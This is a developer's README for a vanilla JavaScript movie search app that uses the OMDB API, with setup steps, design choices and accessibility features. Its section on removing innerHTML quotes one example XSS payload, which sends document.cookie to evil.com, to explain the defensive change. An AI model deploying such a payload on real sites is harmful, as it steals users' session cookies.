# Movie Search Application

A vanilla JavaScript movie search app using the OMDB API. Built with HTML, CSS, and JavaScript—no frameworks or build tools required.

## Problems

- **API Key Note**: The originally provided API key was not working, so I went to the OMDB website, generated and activated a new one from the OMDB website

- **Tooltip Positioning Issue**: Initially, tooltips were positioned absolutely using calculated pixel positions relative to the viewport, causing inconsistent behavior when cards were scrolled out of view. Solution: Each movie card now has its own details container attached via a wrapper structure (`movie-card-wrapper`). Tooltips are positioned relative to their card using CSS classes (`left-side`/`right-side` so that the movie cards on the corners don't have the detail container outside of the viewpot) instead of dynamic calculations, ensuring consistent positioning regardless of scroll position.

## Getting Started

### Backend Setup (Required)

1. Navigate to the `proxy` folder:
```bash
cd proxy
```

2. Install dependencies:
```bash
npm install
```

3. Create `.env` file from `.env-example` and add your OMDB API key:
```bash
cp .env-example .env
# Edit .env and add your API key
```

4. Start the proxy server:
```bash
npm start
```

The server will run on `http://localhost:3000`

### Frontend

1. Install dependencies (if not already done):
```bash
npm install
```

2. Start the frontend server:
```bash
npm run serve
```

3. Open `http://localhost:8000` (a different port may be used if 8000 is not available) in your browser. The frontend will connect to the proxy server running on port 3000.

**Note**: The frontend now uses ES modules, so it must be served over HTTP (not opened directly as a file anymore).

## Features

- **Instant Search**: Real-time search with debounced API calls (more on that below)
- **Responsive Design**: Desktop hover tooltips and mobile bottom sheet container
- **Performance Optimized**: Event delegation, caching, and skeleton loading

## Project Structure

- `index.html` - Main page structure
- `styles.css` - Responsive styling
- `script.js` - Application logic (ES modules)
- `tests/` - Unit tests (Vitest)
- `package.json` - Frontend dependencies and scripts
- `proxy/` - Backend proxy server (Node.js/Express)
  - `server.js` - Express server with OMDB API endpoints
  - `.env` - Environment variables (API keys, not committed to git)
  - `package.json` - Node.js dependencies

## Technical Decisions

### Debouncing
500ms delay after typing stops before API call. Reduces requests from 1 per input to 1 every 500ms, which makes it so that if the user types a long word quickly, regardless of the amount of inputs there will only be 1 request made to the API.

### Event Delegation
Single event listeners on parent container instead of per-card listeners. Scales efficiently with any number of results because I am not appending a new event listener to each individual movie card.

### Caching
Movie details cached in memory object. Subsequent views of same movie are instant with no API call.

### Bottom Sheet (Mobile)
I decided to go with a bottomsheet container (inspired by my experience with react native) so that the UX is better for mobile devices in comparison to random tooltips.

### Skeleton Loading
Shimmer-animated placeholders shown immediately while data loads. Provides instant visual feedback and reduces perceived load time.

### ES Modules
Frontend code uses now ES modules for better code organization, testability, but mainly for accurate test coverage reporting. And now because of this change it requires serving over HTTP (use `npm run serve`).

### Tests
Unit tests for core functions and integration tests for user flows (Completed 84 tests with a 94% coverage)

## Accessibility
- ARIA labels and semantic roles
- Keyboard navigation (Tab, Enter, Space, Escape)
- Screen reader announcements
- Focus trap in modal dialogs

## Backend
I created a very simple backend server to serve as a proxy as secure the api_key that was previouly exposed and hardcoded in the frontend.

## Removing use of "innerHTML"
This was an important security change, because innerHTML parses HTML strings, which can execute malicious scripts. For example, if OMDB or any other third-party service sends malicious content like `Title: "<script>fetch('https://evil.com/steal?cookie=' + document.cookie)</script>"` instead of a regular string, innerHTML could allow attackers to exploit and steal user information.

## Potential Improvements

- **Lazy Loading**: Implement lazy loading for movie poster images to improve initial page load performance
- **Infinite Scroll**: Implement pagination or infinite scroll for search results to handle large result sets
- **Virtualization**: Use virtual scrolling for better performance with hundreds of results
- **Favorites/Bookmarking**: Add ability to save favorite movies with localStorage
- **Error Handling**: Add retry mechanisms and better error messages for failed API calls
